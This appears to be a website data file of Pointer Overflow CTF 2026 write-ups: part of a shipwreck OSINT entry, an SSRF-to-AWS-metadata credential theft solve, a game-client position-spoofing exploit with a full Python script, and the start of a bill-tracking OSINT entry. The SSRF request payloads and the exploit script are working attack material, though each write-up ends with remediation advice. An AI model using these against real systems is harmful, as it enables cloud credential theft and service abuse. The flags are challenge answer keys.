      {
        type: 'image',
        src: '/assets/pointer-overflow-ctf-a-shipwreck-flag.png',
        alt: 'Challenge submission verifying grounding time 19:40 and displaying flag marker',
        caption: 'Challenge portal confirmation: verifying the 19:40 answer and awarding flag marker POCTF{96.374.263cde26c28dcfbc.M4A2Y5KRQIE7IDQAGQHNKKTXDB}'
      },
      {
        type: 'heading',
        text: '6. Limitations and How to Verify'
      },
      {
        type: 'paragraph',
        text: '• Single source for the time: the 19:40 time and the crew list come from one local article (Portal Atrativa, August 2021). I could not cross-check them against a primary record.\n• Location match is by inference: I did not match the image to exact coordinates. The match rests on the town, the estuary and a wreck of this kind being visible offshore.\n• Conflicting details: one source says the ship grounded far out at sea and was then towed to the beach, while another says it grounded near Ilha do Caju and was towed to Barra de Tutóia. The grounding time should refer to the first event, but this is worth checking.\n\nSuggested verification steps:\n1. Open Google Maps or Earth at Tutóia, Maranhão, and compare the shoreline, the road pattern and the wreck\'s position with the challenge image.\n2. Look for Brazilian Navy (Marinha do Brasil) casualty records for the Aline Ramos in November 1981.\n3. Search the Portuguese names "Aline Ramos" and "Barão do Amazonas" in 1981 newspaper archives, such as the Hemeroteca Digital Brasileira.\n4. Check the ship\'s registry history (the Italian ship database naviecapitani.it lists "ALINE RAMOS" as a former name of a vessel, so it may help confirm the hull\'s identity).'
      },
      {
        type: 'heading',
        text: '7. Sources'
      },
      {
        type: 'paragraph',
        text: '• Portal Atrativa, "Conheça a história do navio encalhado que se tornou atração turística em praia maranhense" (August 2021).\n• UAI Serviços, article on Tutóia\'s ecotourism route and the Aline Ramos (July 2026).\n• O Imparcial, report on a canoe accident near the Aline Ramos wreck in Tutóia (July 2026).'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-the-interior-route',
    slug: 'pointer-overflow-ctf-2026-the-interior-route',
    title: 'Pointer Overflow CTF 2026 - The Interior Route',
    platform: 'Pointer Overflow CTF 2026',
    category: 'Web / Cloud',
    difficulty: 'Medium',
    date: 'November 2026',
    readTime: '7 min read',
    os: 'Go / AWS EC2 IMDSv1',
    osLabel: 'TARGET ENVIRONMENT',
    ip: 'Bittner & Cross Link Preview Service',
    ipLabel: 'TARGET SERVICE',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'Web Exploitation', 'SSRF', 'AWS', 'EC2', 'IMDSv1', 'Cloud Security', 'IAM', 'Credential Theft', 'Go'],
    excerpt: 'Server-Side Request Forgery (SSRF) against a link-preview service exploiting an incomplete private network blocklist that omitted the link-local address (169.254.169.254), dumping AWS EC2 IMDSv1 IAM temporary role credentials to extract the flag.',
    userFlag: 'POCTF{84.374.cda6bb67fe226b7d.LJ3SUOBVRXPGWVCIX2QRVGVCVJ}',
    userFlagLabel: 'FLAG (AWS ACCESS KEY ID)',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. The Challenge'
      },
      {
        type: 'paragraph',
        text: 'Bittner & Cross, LLP\'s internal link-preview tool fetches a submitted URL server-side and returns the response body:\n\nPOST /preview\nContent-Type: application/json\n{"url": "https://..."}\n\nThe service claims it "cannot reach any private network," and infrastructure is "provisioned the standard way" — a strong hint toward cloud VM metadata services. This is a textbook SSRF (Server-Side Request Forgery) setup: prove the claimed network boundary is false and use the preview endpoint to reach something it shouldn\'t.'
      },
      {
        type: 'file',
        src: '/assets/the-interior-route-ssrf.docx',
        filename: 'the-interior-route-ssrf.docx',
        label: 'Download the-interior-route-ssrf.docx (Original Writeup Document)',
        caption: 'Challenge writeup document and evidence notes'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig1-service.png',
        alt: 'The Interior Route - Link Preview Service Web Interface',
        caption: 'The Interior Route — Bittner & Cross, LLP internal link-preview service interface'
      },
      {
        type: 'heading',
        text: '2. Recon — Mapping the Filter'
      },
      {
        type: 'paragraph',
        text: 'Rather than guessing, the approach was to probe classes of targets and diff the responses before trying to break anything.\n\nBaseline (loopback):'
      },
      {
        type: 'code',
        code: `POST /preview  {"url": "http://127.0.0.1/"}

Response:
{
  "body": "<!DOCTYPE html>...<h1>Example page preview</h1><p>Link preview unavailable for external URLs in demo mode.</p>...",
  "status": 200,
  "url": "http://127.0.0.1/"
}`
      },
      {
        type: 'paragraph',
        text: 'This canned "demo mode" body turned out to be the tell for "blocked." Every rejected address returned this exact placeholder with a 200 status.\n\nFirst probe at the metadata address:'
      },
      {
        type: 'code',
        code: `POST /preview  {"url": "http://169.254.169.254/latest/meta-data/"}

Response:
{"error": "fetch failed: HTTP Error 404: NOT FOUND"}`
      },
      {
        type: 'paragraph',
        text: 'A genuinely different response shape — a real fetch error, not the placeholder. The request reached a live backend; it just hit the wrong path.\n\nConfirming the boundary: a wide batch of RFC1918/private/loopback targets and IP-obfuscation tricks (octal, decimal, hex, IPv6-mapped, trailing dot, nip.io wildcard DNS) all returned the identical placeholder:\n\n10.0.0.1, 172.16.0.1, 192.168.0.1/1.1, internal, admin, flag-server, app, api, 127.0.0.1:3000/5000/8000/9000, [::1], 0.0.0.0, 0177.0.0.1 (octal)\n\nConclusion: the filter resolves hostnames before checking them (not naive string matching) — but its blocklist covers only RFC1918 private ranges and loopback. It never covers the link-local range 169.254.0.0/16, where cloud metadata services live. That gap is the vulnerability.\n\nRuling out "every path 404s": a wide spread of plausible metadata paths and ports (ECS, Azure, DigitalOcean styles; /latest/user-data; various ports 1338/8080/8000/9000) all returned the same fetch failed: HTTP Error 404: NOT FOUND — ambiguous at the time, prompting a detour into bypass techniques before the real path was found.'
      },
      {
        type: 'heading',
        text: '3. Dead Ends — SSRF Bypass Attempts'
      },
      {
        type: 'paragraph',
        text: 'Several standard SSRF/redirect bypass techniques were tried, on the theory 169.254.169.254 might be string-blocked. None were ultimately necessary, but they\'re documented as useful negative results.\n\nPublic URL shorteners refuse to create the link. TinyURL and is.gd both detected the metadata IP and blocked shortening it outright:'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig2-tinyurl.png',
        alt: 'TinyURL API blocks metadata IP',
        caption: 'TinyURL API blocks shortening metadata IP: "Sorry, you have been blocked"'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig3-isgd.png',
        alt: 'is.gd blocks metadata IP',
        caption: 'is.gd blocks metadata IP: "Error: Please enter a valid URL to shorten"'
      },
      {
        type: 'paragraph',
        text: 'httpbin.org\'s /redirect-to blocks internal destinations directly:\nForbidden redirect target: redirect target is an internal address'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig4-httpbin-internal.png',
        alt: 'httpbin.org /redirect-to blocks internal destination address',
        caption: 'httpbin.org /redirect-to blocks internal destinations directly'
      },
      {
        type: 'paragraph',
        text: 'URL-parser confusion (userinfo @ trick) produced a parse error rather than a bypass — but fingerprinted the backend as Go (net/url: invalid userinfo):'
      },
      {
        type: 'code',
        code: `{"status_code": 400, "error": "Bad Request", "detail": "invalid url: parse \\"http://169.254.169.254\\\\\\\\@example.com/latest/meta-data/\\": net/url: invalid userinfo"}`
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig5-userinfo-error.png',
        alt: 'URL parse error fingerprinting Go net/url parser',
        caption: 'URL-parser confusion error fingerprinting Go net/url parser'
      },
      {
        type: 'paragraph',
        text: 'httpbin\'s redirect allowlist: pivoting to a trusted-domain redirector (Google\'s open redirect) revealed httpbin restricts all redirect destinations to a fixed allowlist (example.com, httpbin.org, etc.) — ruling it out as a redirector for any target.'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig6-httpbin-allowlist.png',
        alt: 'httpbin redirect destination allowlist rejection',
        caption: 'httpbin redirect destination fixed allowlist rejection'
      },
      {
        type: 'paragraph',
        text: 'DNS rebinding (rbndr.us) was tried directly, alternating DNS answers between a safe IP and the target:'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig7-rbndr-forbidden.png',
        alt: 'httpbin rejecting rbndr.us domain redirect',
        caption: 'httpbin rejecting rbndr.us domain redirect'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig8-rbndr-placeholder.png',
        alt: 'Link preview with rbndr.us resolving to placeholder demo HTML',
        caption: 'Link preview with rbndr.us resolving to placeholder demo HTML'
      },
      {
        type: 'paragraph',
        text: 'DNS rebinding returned the placeholder, not a real 404 — meaning this lookup resolved to the "safe" side. This reinforced that the earlier blanket 404s across all paths/ports on 169.254.169.254 were not a block artifact — they were genuine 404s from a real backend missing those exact paths. No bypass was needed; the direct address was reachable all along, and the search needed to return to finding the correct path.'
      },
      {
        type: 'heading',
        text: '4. Exploitation — Walking the Metadata Tree'
      },
      {
        type: 'paragraph',
        text: 'Returning to direct requests against 169.254.169.254 with an AWS-IMDSv1-flavored path:'
      },
      {
        type: 'code',
        code: `POST /preview  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

Response:
{
  "body": "poctf-service-role\\n",
  "status": 200,
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}`
      },
      {
        type: 'paragraph',
        text: 'The breakthrough: a real IAM role name, poctf-service-role — confirming classic AWS EC2 Instance Metadata Service v1 (IMDSv1) behavior, where an unauthenticated GET against iam/security-credentials/ lists any attached IAM role, no token required.'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig9-imds-iam-role.png',
        alt: 'Successful IMDSv1 query exposing attached IAM role: poctf-service-role',
        caption: 'Successful IMDSv1 query exposing attached IAM role: poctf-service-role'
      },
      {
        type: 'paragraph',
        text: 'Retrieving the role\'s credentials:'
      },
      {
        type: 'code',
        code: `POST /preview  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/poctf-service-role"}

Response:
{
  "Code": "Success",
  "LastUpdated": "2026-10-25T09:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "POCTF{84.374.cda6bb67fe226b7d.LJ3SUOBVRXPGWVCIX2QRVGVCVJ}",
  "SecretAccessKey": "AAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAA",
  "Token": "AAAAAAAAAAAAA",
  "Expiration": "2026-10-25T21:00:00Z"
}`
      },
      {
        type: 'paragraph',
        text: 'The flag is embedded directly in the AccessKeyId field — mirroring exactly what a real SSRF-to-credential-theft compromise would expose.'
      },
      {
        type: 'image',
        src: '/assets/interior-route-fig10-flag-submission.png',
        alt: 'Link preview response exfiltrating IAM credentials and successful flag submission',
        caption: 'Retrieving role credentials via SSRF: AccessKeyId contains the flag marker, confirmed with "Credentials exfiltrated"'
      },
      {
        type: 'heading',
        text: '5. Root Cause & Remediation'
      },
      {
        type: 'paragraph',
        text: '• Root cause:\n1. The SSRF filter resolves hostnames before checking them, but its blocklist covers only RFC1918 private ranges and loopback — never the link-local range 169.254.0.0/16.\n2. The instance exposes IMDSv1 with an IAM role (poctf-service-role) attached. IMDSv1 needs no token, so any server-side GET that reaches the address can walk iam/security-credentials/ and pull live credentials.\nTogether: any unauthenticated user of the public preview endpoint can pivot through the server into its cloud identity.\n\n• Remediation:\n1. Expand the SSRF blocklist to cover 169.254.0.0/16, ideally via a default-deny allowlist rather than a denylist.\n2. Disable IMDSv1 and enforce IMDSv2 (HttpTokens: required), which needs a session token from a PUT request with a custom header (X-aws-ec2-metadata-token) — something a GET-based SSRF cannot forge.\n3. Apply least privilege to the attached IAM role to limit blast radius.\n4. Isolate outbound fetches at the network layer (egress proxy / network namespace with no route to 169.254.169.254) rather than relying solely on application-level filtering.'
      },
      {
        type: 'heading',
        text: '6. Flag'
      },
      {
        type: 'code',
        code: `POCTF{84.374.cda6bb67fe226b7d.LJ3SUOBVRXPGWVCIX2QRVGVCVJ}`
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-client-side-truth',
    slug: 'pointer-overflow-ctf-2026-client-side-truth',
    title: 'Pointer Overflow CTF 2026 - Client-Side Truth (GH 200)',
    platform: 'Pointer Overflow CTF 2026',
    category: 'Game Hacking / Web API',
    difficulty: '200 pts • Wave 2',
    date: 'November 2026',
    readTime: '7 min read',
    os: 'Godot Engine (GDScript / HTTP API)',
    osLabel: 'GAME ENGINE & TECH',
    ip: 'https://pointeroverflowctf.com/challenges/client-side-truth',
    ipLabel: 'CHALLENGE API',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'Game Hacking', 'Godot', 'GDScript', 'Decompilation', 'API Exploitation', 'Teleportation', 'Client Trust', 'Python'],
    excerpt: 'Reverse engineering a decompiled Godot game client (.gdc scripts) to exploit missing server-side position validation, fabricating coordinates to teleport directly into the boss gating arena (count_room_aabb) and automating attacks via raw HTTP requests.',
    userFlag: 'POCTF{136.374.12c2b97d7ae020372675e8c479b972e4.NWJFNGUMHSYQYS7L5MNN6URWUT}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Summary'
      },
      {
        type: 'paragraph',
        text: 'The challenge ships a Godot game client that fights a boss over HTTP. The flavor text telegraphs the bug directly: the server claims to be "server-authoritative" and "100% SEC-UR[E]", except the dev admits "if the client decides what\'s true, the client can lie." Decompiling the shipped .gdc scripts confirmed exactly that: the player\'s position is self-reported by the client with no server-side movement or physics validation. A gating region (count_room_aabb) controls access to the boss fight, but since the server trusts whatever x, y, z the client sends in POST /game/pos, you can teleport into that region without ever playing the level, then spam fire until the boss dies — no actual gameplay skill required.'
      },
      {
        type: 'file',
        src: '/assets/client-side-truth-exploit.py',
        filename: 'client-side-truth-exploit.py',
        label: 'Download client-side-truth-exploit.py (Automated Solve Script)',
        caption: 'Python solve script automating authentication, arena teleportation, and combat API requests'
      },
      {
        type: 'file',
        src: '/assets/client-side-truth-writeup.md',
        filename: 'client-side-truth-writeup.md',
        label: 'Download client-side-truth-writeup.md (Original Markdown Document)',
        caption: 'Challenge writeup document and evidence notes'
      },
      {
        type: 'heading',
        text: '2. Reconnaissance & Architecture'
      },
      {
        type: 'paragraph',
        text: 'Two components were provided: the distributed game binaries, and a decompiled Godot project (Project Recovery / .pck extraction showing .gdc and .gd.remap files under res://). Key scripts recovered:\n\n• auth_check.gd — login and credential handling for the game client\n• NetworkClient.gd — all gameplay HTTP endpoints (/game/start, /game/pos, /game/fire, /game/state, /game/win_marker)\n• FlagToken.gd — a separate endpoint (/api/challenges/51/complete) used only to mint the final platform marker from a nonce\n• SessionStore.gd — plain data holder (game_token, team_key, nonce, team_id)'
      },
      {
        type: 'heading',
        text: '3. The Trust Bug (NetworkClient.gd)'
      },
      {
        type: 'paragraph',
        text: 'Reading NetworkClient.gd revealed how coordinates are handled:'
      },
      {
        type: 'code',
        code: `func game_pos(pos: Vector3) -> void:
	_http_post("/challenges/client-side-truth/game/pos", {
		"ts": _server_ts_ms_estimate(),
		"x": pos.x, "y": pos.y, "z": pos.z,
	}, func(_d): pass)`
      },
      {
        type: 'paragraph',
        text: 'The client simply tells the server where it claims to be. In contrast, game_fire and game_state rely on the server computing hit, boss_hp, and won — those mechanics are truly server-authoritative. Position is the single attribute the server blindly trusts from the client, making it the intended vulnerability.'
      },
      {
        type: 'heading',
        text: '4. Working Out Authentication'
      },
      {
        type: 'paragraph',
        text: 'auth_check.gd revealed how credentials map to a numeric team_id, which isn\'t given directly in the credentials bundle — it must be parsed from the team key:'
      },
      {
        type: 'code',
        code: `func _parse_team_id(team_key: String) -> int:
	var parts := team_key.strip_edges().split("-")
	for i in range(parts.size()):
		if i == 0: continue
		if parts[i].is_valid_int():
			return parts[i].to_int()
	return 0`
      },
      {
        type: 'paragraph',
        text: 'For team key TEAMKEY136-374-7CD759972AF2, splitting on - yields ["TEAMKEY136", "374", "7CD759972AF2"]; skipping index 0, the first valid integer is 374 → team_id = 374. (Earlier guesses of 5, 136, and 0 from token strings failed authentication with 401 {"error":"auth"}).\n\nHeaders used for the gameplay API (per NetworkClient._headers()):\n• Authorization: Bearer <game_token>\n• X-Team-ID: <team_id>'
      },
      {
        type: 'heading',
        text: '5. Exploit Strategy & Teleportation'
      },
      {
        type: 'paragraph',
        text: 'Initiating the game with POST /game/start returned the arena boundaries:'
      },
      {
        type: 'code',
        code: `{
  "arena": {
    "count_room": {"min": [-22.5, 20.6, 15.6], "max": [-17.5, 23.0, 20.6]},
    "floor":      {"min": [-25.0, -0.5, -25.0], "max": [25.0, 5.0, 25.0]}
  },
  "boss_pos": [0.0, 1.0, 15.0],
  "boss_hp": 500,
  "boss_max_hp": 500,
  "spawn": [0.0, 0.5, -15.0]
}`
      },
      {
        type: 'paragraph',
        text: 'Exploit execution plan:\n1. Compute the center point of count_room_aabb → (-20.0, 21.8, 18.1).\n2. Send POST /game/pos with that coordinate as x, y, z. The server accepted the teleportation with {"ok": true} — no velocity, collision, or distance validation.\n3. Loop POST /game/fire (re-asserting position each iteration) until boss_hp hit 0. The server computed hit: true and subtracted 50 HP per hit.\n4. Call GET /game/state → confirmed won: true.\n5. Call GET /game/win_marker → returned the flag directly.\n\nNo client rendering, level navigation, or combat mechanics required — 10 raw HTTP requests completed the challenge.'
      },
      {
        type: 'heading',
        text: '6. Automated Python Exploit Script'
      },
      {
        type: 'code',
        code: `import requests
import time

API_BASE = "https://pointeroverflowctf.com"

GAME_TOKEN = "POCTF-GAME-5-136-718aac0bc1359cdaf9bbe1"
TEAM_KEY = "TEAMKEY136-374-7CD759972AF2"
TEAM_ID = 374  # parsed from team.key per auth_check.gd's _parse_team_id logic

session = requests.Session()
session.headers.update({
    "Authorization": f"Bearer {GAME_TOKEN}",
    "X-Team-ID": str(TEAM_ID),
    "Content-Type": "application/json",
})

def post(path, body=None):
    r = session.post(API_BASE + path, json=body or {})
    print(path, "->", r.status_code, r.text[:300])
    r.raise_for_status()
    return r.json()

def get(path):
    r = session.get(API_BASE + path)
    print(path, "->", r.status_code, r.text[:300])
    r.raise_for_status()
    return r.json()

# 1. Start the game, get arena info
start = post("/challenges/client-side-truth/game/start")
boss_pos = start.get("boss_pos", [0, 1.5, 6.0])
arena = start.get("arena", {})
count_room = arena.get("count_room", {})

def center_of_aabb(aabb):
    if not aabb:
        return None
    mn, mx = aabb.get("min"), aabb.get("max")
    if mn and mx:
        return [(mn[i] + mx[i]) / 2 for i in range(3)]
    return None

target = center_of_aabb(count_room) or boss_pos
print("Reporting position:", target)

# 2. Report a fabricated position inside the gating region, never walked to
post("/challenges/client-side-truth/game/pos", {
    "ts": int(time.time() * 1000),
    "x": target[0], "y": target[1], "z": target[2],
})

# 3. Spam fire until the boss is dead, re-asserting position each time
for i in range(100):
    post("/challenges/client-side-truth/game/pos", {
        "ts": int(time.time() * 1000),
        "x": target[0], "y": target[1], "z": target[2],
    })
    result = post("/challenges/client-side-truth/game/fire",
                   {"ts": int(time.time() * 1000)})
    hp = result.get("boss_hp")
    print(f"shot {i}: hit={result.get('hit')} boss_hp={hp}")
    if hp is not None and hp <= 0:
        break

# 4. Confirm win, pull the flag
state = get("/challenges/client-side-truth/game/state")
print("won:", state.get("won"))

if state.get("won"):
    marker = get("/challenges/client-side-truth/game/win_marker")
    print("FLAG / MARKER:", marker.get("flag"))`
      },
      {
        type: 'heading',
        text: '7. Full Run Output'
      },
      {
        type: 'code',
        code: `/challenges/client-side-truth/game/start -> 200 {"arena":{"count_room":{"max":[-17.5,23.0,20.6],"min":[-22.5,20.6,15.6]},"floor":{"max":[25.0,5.0,25.0],"min":[-25.0,-0.5,-25.0]}},"boss_hp":500,"boss_max_hp":500,"boss_pos":[0.0,1.0,15.0],"lag_comp_ms":150,"ok":true,"server_ts_ms":1794757010308,"spawn":[0.0,0.5,-15.0]}

boss_pos: [0.0, 1.0, 15.0]
count_room_aabb: {'max': [-17.5, 23.0, 20.6], 'min': [-22.5, 20.6, 15.6]}
floor_aabb: {'max': [25.0, 5.0, 25.0], 'min': [-25.0, -0.5, -25.0]}
Reporting position: [-20.0, 21.8, 18.1]

/challenges/client-side-truth/game/pos -> 200 {"ok":true,"server_ts_ms":1794757010513}
/challenges/client-side-truth/game/pos -> 200 {"ok":true,"server_ts_ms":1794757010717}
/challenges/client-side-truth/game/fire -> 200 {"boss_hp":450,"hit":true,"ok":true,"server_ts_ms":1794757010915}
shot 0: hit=True boss_hp=450

/challenges/client-side-truth/game/pos -> 200 {"ok":true,"server_ts_ms":1794757011120}
/challenges/client-side-truth/game/fire -> 200 {"boss_hp":400,"hit":true,"ok":true,"server_ts_ms":1794757011328}
shot 1: hit=True boss_hp=400
...
/challenges/client-side-truth/game/fire -> 200 {"boss_hp":0,"hit":true,"ok":true,"server_ts_ms":1794757014609}
shot 9: hit=True boss_hp=0

/challenges/client-side-truth/game/state -> 200 {"boss_hp":0,"has_pos":true,"ok":true,"server_player_pos":[-20.0,21.8,18.1],"server_ts_ms":1794757014807,"won":true}
won: True

/challenges/client-side-truth/game/win_marker -> 200 {"flag":"POCTF{136.374.12c2b97d7ae020372675e8c479b972e4.NWJFNGUMHSYQYS7L5MNN6URWUT}","ok":true}
FLAG / MARKER: POCTF{136.374.12c2b97d7ae020372675e8c479b972e4.NWJFNGUMHSYQYS7L5MNN6URWUT}`
      },
      {
        type: 'heading',
        text: '8. Root Cause & Recommendations'
      },
      {
        type: 'paragraph',
        text: '• Root Cause: Missing server-side authority over client-reported position. The game correctly calculates damage and win-state on the server, but gating access to the boss fight is trusted verbatim from client telemetry without velocity limits or teleportation checks.\n\n• Recommendations:\n1. Never trust client-reported absolute position for gating logic. Enforce velocity bounding: reject position updates where distance delta > max_player_speed * time_delta.\n2. Derive room access from server-side state transitions (e.g., an explicit server-validated enter_room trigger).\n3. Remove or compile-out the _dev_bypass() routine from distributed game binaries to avoid universal auth bypasses in debug builds.'
      },
      {
        type: 'heading',
        text: '9. Secondary Finding: Hardcoded Dev Bypass'
      },
      {
        type: 'paragraph',
        text: 'auth_check.gd\'s _dev_bypass() hardcodes a working token/key pair (POCTF-GAME-5-136-ebb8ab57829e79d045fd0f / TEAMKEY136--1-280BC7B13C60) and skips normal credential verification whenever OS.is_debug_build() is true. If any distributed binary is accidentally an unexported or debug build, this pair grants unconditional universal access regardless of team identity.'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-following-the-money',
    slug: 'pointer-overflow-ctf-2026-following-the-money',
    title: 'Pointer Overflow CTF 2026 - Following the Money',
    platform: 'Pointer Overflow CTF 2026',
    category: 'OSINT',
    difficulty: 'Wave 8 • Advanced',
    date: 'November 2026',
    readTime: '9 min read',
    os: 'Astrometry / EXIF / Geolocation / FITS',
    osLabel: 'INVESTIGATION METHODS',
    ip: 'Ribblehead Viaduct, North Yorkshire, UK',
    ipLabel: 'GROUND TRUTH LOCATION',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'OSINT', 'Astrometry', 'WheresGeorge', 'Plate Solving', 'EXIF Forensics', 'FITS', 'Geolocation', 'Red Herring Analysis'],
    excerpt: 'Reassembling 30 shredded $1 bill fragments to extract a serial number, tracking it via WheresGeorge to an astrophotography blog, and breaking down a massive multi-layered astronomical rabbit hole to identify Ribblehead Viaduct and recover the flag.',
    userFlag: 'POCTF{98.374.PRRQ5USL76UK5U6K.AQABGUAC2ZVDS5J3NPSSXQ7WRC}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge Prompt & Evidence'
      },
      {
        type: 'paragraph',
        text: 'A $1 bill came off the scanner in pieces. Reassemble it, then answer the question: where am I? The bill has been places. Wherever it last left a record, so did the person who carried it. Find them. Find where they pointed the camera and what the camera saw.\n\n• Evidence provided: bill-fragments.zip — 30 irregular PNG scraps of a torn $1 bill (SHA-256: 864cbc23a8756ed94d793f6f81259b47857b71d16268ca3ad0d2ca7f9cd6b90a)\n• Final answer form prompt: "I know my latitude is 54.1116° N. Figure out my longitude and submit it."'
      },
      {
        type: 'file',
        src: '/assets/bill-fragments.zip',
        filename: 'bill-fragments.zip',
        label: 'Download bill-fragments.zip (30 Torn Bill Fragments)',
        caption: 'Challenge evidence package containing 30 PNG fragments of a shredded $1 bill'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-form-placeholder.png',
        alt: 'Challenge submission form prompt asking for longitude',
        caption: 'Challenge submission form: "WHERE AM I? I know my latitude is 54.1116° N. Figure out my longitude and submit it."'
      },
      {
        type: 'heading',
        text: '2. Reassembling the Bill'
      },
      {
        type: 'paragraph',
        text: 'The 30 fragments were laid out on a contact sheet to identify matching pieces. Three fragments contained overlapping digits of the bill\'s serial number:\n• Fragment showing: E100\n• Fragment showing: 093751B\n• Overlap digit "0" connecting them\n\nReconstructed serial number: E10093751B\n\nSignatures visible on adjacent fragments (Mnuchin / Carranza) identified this as a Series 2017A $1 Federal Reserve Note, with green seal letter E indicating the Richmond district.'
      },
      {
        type: 'heading',
        text: '3. Where\'s George Lookup & Note Discovery'
      },
      {
        type: 'paragraph',
        text: 'Pivoting to wheresgeorge.com to search the recovered serial number (E10093751B, entering ZIP code 1001 for lookup). Answering "No" to physical possession allowed retrieving the public tracking report without claiming the bill:\n\n• Report URL: https://www.wheresgeorge.com/report.php?b=Fuzhs8rJ7u (Short link: https://wg4.us/b:Fuzhs8rJ7u)'
      },
      {
        type: 'table',
        headers: ['Field', 'Value'],
        rows: [
          ['Serial / Series', 'E1009---1B, Series 2017'],
          ['Entry location', 'Stevens Point, WI'],
          ['Entry time', '08-Nov-2026 07:52 PM'],
          ['Status', 'Blocked from entry — "Online Nov 2026"']
        ]
      },
      {
        type: 'paragraph',
        text: 'Critical clue in the user\'s note on the bill:\n"Carried this one in my pocket on a night shoot last October. Wrote it up with some photos on my hobby blog: https://pointeroverflowctf.com/challenges/following-the-money/astroblog/"'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-wheresgeorge-report.jpg',
        alt: 'WheresGeorge Bill Tracking Report',
        caption: 'WheresGeorge Bill Tracking Report for E1009---1B leaking the astrophotography hobby blog URL'
      },
      {
        type: 'heading',
        text: '4. The Astroblog & Photo Analysis'
      },
      {
        type: 'paragraph',
        text: 'Navigating to the personal journal night-sky.notes ("Where I point the camera when I should be sleeping") at https://pointeroverflowctf.com/challenges/following-the-money/astroblog/:'
      },
      {
        type: 'table',
        headers: ['Post', 'Title', 'Date', 'Notes'],
        rows: [
          ['#137', 'The viaduct, finally clear', 'October 2024', 'Relevant post — contains target astrophotography images'],
          ['#136', 'Leonids over the back garden', 'November 2023', 'No post content (flavor text)'],
          ['#135', 'Why I started tracking my bills', 'August 2023', 'Explains the WheresGeorge bill tracking origin']
        ]
      },
      {
        type: 'image',
        src: '/assets/following-the-money-astroblog-index.jpg',
        alt: 'Astroblog journal index',
        caption: 'Astroblog journal index showing posts #135, #136, and #137'
      },
      {
        type: 'paragraph',
        text: 'Post #137 text:\n"Six times this autumn I\'ve driven up to the viaduct with the tripod in the boot and six times the clouds have rolled in before I could get set up. Not this time. Walked up from the car park with the torch off, sat the Pentax on the stones by the embankment, and got exactly one good exposure before the moon came over the fell. Everything I ever come up here for is in this one frame."\n\n• Metadata: Captured 2024-10-12T23:17:02Z. 30 seconds at f/2.8, ISO 1600.\n• Notes: "Posting a second version too — I drew the horizon line in by eye because the sky in the upper left plays tricks on you if you don\'t have a reference. Same frame, just marked up."\n• Camera Specs: "Image is 1620 pixels tall, 45.9° vertical FOV (standard Pentax 24mm on crop-sensor)."'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-astroblog-post137-top.jpg',
        alt: 'Post #137 top section',
        caption: 'Astroblog Post #137: "The viaduct, finally clear" with unredacted photograph'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-viaduct-starfield.jpg',
        alt: 'Unredacted starfield over viaduct',
        caption: 'viaduct-starfield.jpg (1080×1620) — Full unredacted photo showing Ribblehead-style viaduct silhouette and Milky Way'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-astroblog-post137-bottom.jpg',
        alt: 'Post #137 bottom section',
        caption: 'Astroblog Post #137 lower section showing horizon-marked image and camera sensor specifications'
      },
      {
        type: 'image',
        src: '/assets/following-the-money-viaduct-horizon-marked.jpg',
        alt: 'Horizon marked redacted photo',
        caption: 'viaduct-horizon-marked.jpg — Ground replaced by [REDACTED] purple block and hand-drawn HORIZON line at row 1444'
      },
      {
        type: 'heading',
        text: '5. Decoy Layer — Planted EXIF & Shakespeare Sonnet'
      },
      {
        type: 'paragraph',
        text: 'Extracting EXIF metadata from viaduct-horizon-marked.jpg revealed hand-crafted coordinates:\n\n• GPSLatitude: 33° 44.838\' 0" N → 33.7473° N\n• GPSLongitude: 112° 38.034\' 0" W → -112.6339° W (Phoenix, Arizona)\n• GPSTimeStamp: 22:44:26\n• Image Make / Model: Tarapaca / Gigante X87\n• ImageDescription: "Not from the stars do I my judgement pluck,"\n• EXIF UserComment: "But not to tell of good or evil luck."\n\nThe two lines are from Shakespeare\'s Sonnet 14 — a poem about refusing to read fate in the stars. This was a deliberate thematic joke mocking anyone submitting raw EXIF coordinates, as Phoenix (33.75° N) completely contradicted the challenge\'s known latitude (54.1116° N).'
      },
      {
        type: 'heading',
        text: '6. Astronomy Attempts (The Plate-Solving Rabbit Hole)'
      },
      {
        type: 'paragraph',
